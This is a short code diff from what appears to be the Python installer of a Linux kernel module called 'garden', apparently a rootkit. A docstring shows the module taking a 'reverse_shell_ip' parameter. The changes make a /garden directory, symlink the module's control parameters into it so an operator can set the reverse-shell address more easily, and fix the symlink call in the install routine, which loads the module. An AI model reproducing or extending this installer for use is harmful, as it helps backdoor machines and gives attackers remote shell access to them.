@@ -232,9 +232,13 @@ def symlink_command_files(driver_name):
 	$ echo "$IP > /sys/module/garden/parameters/reverse_shell_ip
 	to $ echo "$IP > /garden/reverse_shell_ip
 	"""
+	dest_path = "/" + driver_name
+	if not os.path.isdir(dest_path):
+		os.mkdir(dest_path)
+
 	for file in get_all_param_files(driver_name, MODULE_PARAMS):
 		param_name = file.split("/")[-1]
-		os.symlink(file, "{}/{}".format(driver_name, param_name))
+		os.symlink(file, "{}/{}".format(dest_path, param_name))
 
 
 def cleanup_command_files(driver_name):
@@ -326,7 +330,7 @@ def install(kernel_version):
 	unload_module(config["MODULE_NAME"])
 	load_module(module_dest_path, config)
 	update_permissions(driver_name)
-	symlink_command_files(driver_name, config["MODULE_NAME"])
+	symlink_command_files(config["MODULE_NAME"])
 	print_success("Successful installation.")
 
 
